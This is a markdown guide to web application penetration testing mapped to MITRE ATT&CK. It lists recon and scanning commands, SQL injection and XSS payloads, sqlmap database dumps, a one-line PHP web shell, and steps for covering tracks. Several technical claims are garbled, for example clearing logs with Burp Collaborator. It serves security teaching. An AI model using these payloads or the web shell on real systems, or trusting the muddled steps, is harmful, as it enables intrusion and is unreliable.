# **Basic Web Application Penetration Testing Methodology**

## **Scenario:**
You are conducting a full web application penetration test with minimal initial information (e.g., a domain or IP). This guide includes **multiple redundant techniques** for each step and maps to **MITRE ATT&CK Techniques (TTPs)** where applicable.
[The overview document provides a high level process of testing but is in no means recommended for every scenario, tools change, patches release. 
understand how the technologies work, use tools where needed but dont rely on them, better yet, make your own make them better. See listing document and pair the methods in the listings with sources such as Atomic, Hacktricks, and PTES, for more information.](https://youtu.be/hlbjUvkoyBA?si=2euQgcK7aaPatiAv)
---

# **🛠 Step 1: Information Gathering (Reconnaissance) (T1595, T1590, T1596)**
**Objective:** Identify domains, subdomains, technologies, and potential entry points.

### **1.1 Passive Reconnaissance**
- **Primary Method: WHOIS Lookup (T1596.001)**
  ```bash
  whois <domain>
  ```
- **Alternative Methods:**
  - **Check SSL/TLS Certificates (T1596.002):**
    ```bash
    crt.sh/?q=<domain>
    ```
  - **Search Public Data Breaches (T1596.005):**
    ```bash
    haveibeenpwned.com
    ```

### **1.2 Subdomain Enumeration**
- **Primary Method: Amass (T1590.002)**
  ```bash
  amass enum -d <domain>
  ```
- **Alternative Methods:**
  - **Subfinder:**
    ```bash
    subfinder -d <domain>
    ```
  - **Bruteforcing Subdomains:**
    ```bash
    gobuster dns -d <domain> -w subdomains.txt
    ```

### **1.3 Web Technology Fingerprinting**
- **Primary Method: WhatWeb (also wpscan after identifying correct CMS) (T1590.002)**
  ```bash
  whatweb <URL>
  ```
- **Alternative Methods:**
  - **Wappalyzer:**
    ```bash
    wappalyzer <URL>
    ```
  - **Nmap HTTP Enumeration:**
    ```bash
    nmap -p80,443 --script http-title,http-server-header,http-waf-detect <target>
    nmap -sS -PS 80,443
    nmap -pN
    ```
  - **Others:**
    See CMSSCAN also as it can identify CMS versions through various methods rather quickly, this is useful for identifying common exploits for a particular version.
---

# **📡 Step 2: Scanning & Enumeration (T1595, T1592, T1590)**
**Objective:** Identify endpoints, directories, parameters, and vulnerabilities.

### **2.1 Directory & File Enumeration**
- **Primary Method: Dirsearch (T1590.002)**
  ```bash
  dirsearch -u <URL> -e php,asp,txt
  ```
- **Alternative Methods:**
  - **Gobuster:**
    ```bash
    gobuster dir -u <URL> -w wordlist.txt
    ```
  - **Ffuf:** (Go to favorite)
    ```bash
    ffuf -u <URL>/FUZZ -w wordlist.txt
    ```

### **2.2 Parameter Discovery**
- **Primary Method: Arjun (T1590.002)**
  ```bash
  python3 arjun.py -u <URL> --get
  ```
- **Alternative Methods:**
  - **Param Miner (Burp Extension)**
  - **Manually inspecting JavaScript files**

### **2.3 Vulnerability Scanning**
- **Primary Method: Nikto (T1595.002)**
  ```bash
  nikto -h <URL>
  ```
- **Alternative Methods:**
  - **Nuclei:**
    ```bash
    nuclei -u <URL> -t cves/
    ```
  - **ZAP Scanner:**
    ```bash
    zap-cli quick-scan <URL>
    ```
 - **Note:**
    Dont forget to search manually, looking at versions, how it is handled, any API keys in the JS source etc. 

---

# **🔑 Step 3: Exploitation (T1190, T1599, T1600)**
**Objective:** Identify and exploit vulnerabilities to gain access.

### **3.1 SQL Injection**
- **Primary Method: SQLMap (T1190)**
  ```bash
  sqlmap -u <URL>?id=1 --dbs --batch
  ```
  dont forget -dump, and -tables, etc etc where the need arises. 

- **Alternative Methods:**
  - **Manual Exploitation:**
    ```sql
    ' OR 1=1--
    ```
  - **Burp Suite SQL Injection Testing**

### **3.2 Cross-Site Scripting (XSS)**
- **Primary Method: XSStrike (T1599.001)**
  ```bash
  python3 xsstrike.py -u <URL>
  ```
- **Alternative Methods:**
  - **Manual Payload Testing:**
    ```html
    <script>alert('XSS');</script>
    ```
  - **Burp Suite XSS Extension**

### **3.3 Server-Side Request Forgery (SSRF)**
- **Primary Method: SSRFMap (T1190)**
  ```bash
  python3 ssrfmap.py -u <URL>
  ```
- **Alternative Methods:**
  - **Manual Payload Testing:**
    ```
    http://localhost/admin
    ```

---

# **📡 Step 4: Post-Exploitation & Data Extraction (T1565, T1567)**
**Objective:** Maintain access, extract data, and escalate privileges.

### **4.1 Credential Extraction**
- **Primary Method: Dump Database Credentials (T1555)**
  ```bash
  sqlmap -u <URL> --dump
  ```
- **Alternative Methods:**
  - **Look for hardcoded creds in JavaScript files**
  - **Check for `/robots.txt` for sensitive paths**

### **4.2 Web Shell Deployment**
- **Primary Method: Upload Malicious PHP Shell (T1505.003)**
  ```php
  <?php system($_GET['cmd']); ?>
  ```
- **Alternative Methods:**
  - **Metasploit Web Shell:**
    ```bash
    use exploit/multi/http/php_webshell
    ```
  - **Reversing LFI to RCE (Log Poisoning)**
  - **Important:**
    It is critical to ensure the right payload is used for the job, make sure to use HTTPS / proxies where needed for your engagement ensuring proper opsec, source code validation of payloads etc. 
    Dont blindly follow every tool and payload everyones written. cypherpunks write code! 
---

# **🛑 Step 5: Covering Tracks (T1070, T1098)**
**Objective:** Hide activity and remove traces.

- **Clear logs using Burp Collaborator (T1070)**
- **Delete uploaded web shells**
- **Reset manipulated credentials**

---

## **🛡️ Defenses Against These Attacks**
✅ **Use Web Application Firewalls (WAFs)**
✅ **Implement Secure Headers (CSP, X-Frame-Options)**
✅ **Sanitize and Validate Input**
✅ **Apply Least Privilege to Database Users**

---

## **📌 Summary of Steps**
| Step | Primary Method | Alternative Methods |
|------|--------------|---------------------|
| **Recon** | Amass | Subfinder, WhatWeb |
| **Scanning** | Dirsearch | Gobuster, Arjun |
| **Exploitation** | SQLMap | Manual SQLi, Burp Suite |
| **Post-Exploitation** | SQL Dump | Credential Harvesting |
| **Covering Tracks** | Log Clearing | WAF Bypass |

